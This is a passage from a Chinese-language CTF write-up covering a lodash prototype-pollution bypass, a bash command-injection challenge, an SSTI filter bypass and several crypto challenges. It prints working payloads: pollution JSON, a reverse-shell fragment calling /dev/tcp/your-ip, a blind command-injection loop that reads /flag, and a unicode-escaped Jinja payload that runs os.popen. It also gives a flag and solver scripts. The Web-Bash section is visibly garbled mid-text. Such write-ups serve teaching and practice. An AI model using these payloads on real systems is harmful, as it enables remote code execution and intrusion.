所以，我们就要尝试去绕过这个点。  
我们来看一下这个语句：
    path !== '' ? _.set(req[location], path, newValue) : _.set(req, location, newValue);
这里的第一个参数是从请求中直接取出来的，path是经过先前处理后的出来的值。所以能不能通过这个处理来进行绕过呢？当然是可以的。  
当我们传入：
    {"\"].__proto__[\"test":"123 "}
这里的键为`"].__proto__["test`，由于字符里面存在`.`，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：`[""].__proto__["test"]`。这时在调用set函数时，值的情况就为：
这时就不存在同名的键了，于是查看污染的后的值发现：
我们设置的值并没有传递进去，而是污染为了一个空值。为什么传递进来的newValue为空值呢？
从select-fields.js中可以看到，是因为取值时，使用的是lodash.get方法从req['body']中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为undefined。
当undefined传递到Sanitization.run方法中后，经过了一个`.toString()`的处理变成了`''`空字符串。
##### lodash.get方法中读取键值的妙用
那我们还有没有办法污染呢？结果肯定是有的，我们跟入这个lodash.get方法，这个方法的具体实现位置位于：lodash/get.js
继续跟踪到lodash/_baseGet.js
从中我们可以看到这个函数取值的一些逻辑，首先，path经过了castPath处理将字符串形式的路径转为了列表，如下面的内容所示。转换完后通过一个while循环将值循环取出，并在object这个字典里去取出对应的值。
    // 初始值
    ['a'].__proto__.['b']
    // 转换完后的值
    ["a","__proto__","b",]
那这个地方能不能利用呢？当然也是可以的，我们来看下最终的payload：
    {"a": {"__proto__": {"test": "testvalue"}}, "a\"].__proto__[\"test": 222}
这个时候我们在这个函数处下断点就可以看到，`a\"].__proto__[\"test`经过castPath处理变成了["a", " **proto**
", "test"]，在Object循环取值最终取到的是`"a": {"__proto__": {"test":
'testvalue'}`中的test键的值，这样就达到了控制value的目的。
还未遍历前：  
最后一次遍历：  
最终污染成功：
## Web-Bash-Vino0o0o
#### 题目原型和出题想法
**原型：** 学习这种绕过姿势来源于之前看的一份34c3
CTF的wp，大体上类似于这一篇：
**想法：** 但是利用上面这种`bash& /dev/tcp/your-ip/2333 0>&1'))
    #盲注
    #a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}@'
    # for i in range(1,50):
    #     for j in a:
    #         cmd=f'cat /flag|grep ^{f+j}&&sleep 3'
    #         url = "http://ip/"
    #         if get_flag(url,build(cmd)):
    #             break
    #     f = f+j
    #     print(f)
## Normal SSTI
#### 题目考点
SSTI 绕过姿势汇总（unicode绕过是一种网上没提出的方法）
#### 题目难度
中等偏难
#### 解题思路
题目主要考察了几个知识点：
  * 没有`{{`情况下如何构造回显
  * 如何绕过字符串过滤
  * 过滤器的熟悉程度
直接放payload吧，很简单的一道题，理解了就懂了：
    /test?url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%}
# Crypto
## 密码学？爆破就行了
这道签到题主要是想给大家推荐一个密码学常用的库,可以多线程的爆破
我用的默认线程解只需要不到7s(还可以更快的)
    #!/usr/bin/python2
    from pwn import pwnlib
    from pwnlib.util.iters import mbruteforce
    import hashlib 
    flag      = 'd0g3{71b2b5616ee2a4639a07d979ebde964c}'
    msgbroken = 'd0g3{71b2b5616**2a4639**7d979**de964c}'
    table = '0123456789abcdef'
    assert len(table) == 16
    m1 = 'd0g3{71b2b5616'
    m2 = '2a4639'
    m3 = '7d979'
    m4 = 'de964c}'
    def f(res):
        ciphier = '0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a'
        msgbroken = m1 + res[0:2] + m2 + res[2:4] + m3 + res[4:6] + m4
        tmp = hashlib.sha256(msgbroken).hexdigest()
        if tmp == ciphier:
            return True
    res = mbruteforce(f,table,6,method='fixed')
    print(m1 + res[0:2] + m2 + res[2:4] + m3 + res[4:6] + m4 )
## easyaes
#### 思路
hint和key长度不等,且hint为四个字符的重复
即输出的密文中有部分hint的字符,可以首先恢复hint再逐步次求出key
已知密文、明文、私钥可以根据aes的cbc模式原理求出位移
    #!/usr/bin/python
    from Crypto.Util.number import long_to_bytes